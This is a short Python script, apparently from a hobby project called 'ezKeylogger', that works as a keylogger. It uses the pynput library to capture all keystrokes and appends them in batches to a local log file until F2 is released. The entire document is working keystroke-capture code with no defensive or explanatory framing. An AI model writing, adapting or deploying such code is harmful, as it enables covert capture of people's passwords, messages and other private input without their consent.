#imported from required library pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    #print("{0} pressed".format(key))

    if count >= 20 or str(key) == "Key.enter":
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.f2:
        return False

def write_file(keys):
    with open("ezKeylogger/logs/log.txt", "a") as f:
        for key in keys:
            key = str(key).replace("'","")
            if key.find("space") > 0:
                f.write("\n")
            elif key.find("Key"):
                f.write(key)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()